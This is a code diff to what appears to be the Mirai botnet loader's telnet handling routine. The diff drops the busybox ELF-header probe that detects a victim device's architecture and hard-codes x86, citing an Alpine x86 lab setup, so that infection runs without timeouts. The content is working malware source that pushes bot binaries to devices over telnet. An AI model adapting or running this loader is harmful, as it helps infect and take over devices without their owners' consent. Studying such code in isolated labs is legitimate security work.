@@ -368,20 +368,15 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
                             printf("[FD%d] Finished copying /bin/echo to cwd\n", conn->fd);
 #endif
-                            if (!conn->info.has_arch)
+                            /* Lab: all targets are Alpine x86 — skip ELF dump over telnet */
+                            strcpy(conn->info.arch, "x86");
+                            conn->info.has_arch = TRUE;
+                            if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)
                             {
-                                conn->state_telnet = TELNET_DETECT_ARCH;
-                                conn->timeout = 120;
-                                /*
-                                 * Dump only the ELF header. Full `cat /bin/echo` on
-                                 * Alpine/LXC sends the whole busybox binary over telnet,
-                                 * which times out and floods the parser with garbage.
-                                 * connection_consume_arch() only needs the "ELF" magic.
-                                 * Shortcut B: stdin `ip:port user:pass x86` skips this.
-                                 */
-                                // DO NOT COMBINE THESE
-                                util_sockprintf(conn->fd, "/bin/busybox head -c 32 /bin/echo\r\n");
-                                util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
+#ifdef DEBUG
+                                printf("[FD%d] Cannot determine architecture / missing binary\n", conn->fd);
+#endif
+                                connection_close(conn);
                             }
                             else
                             {
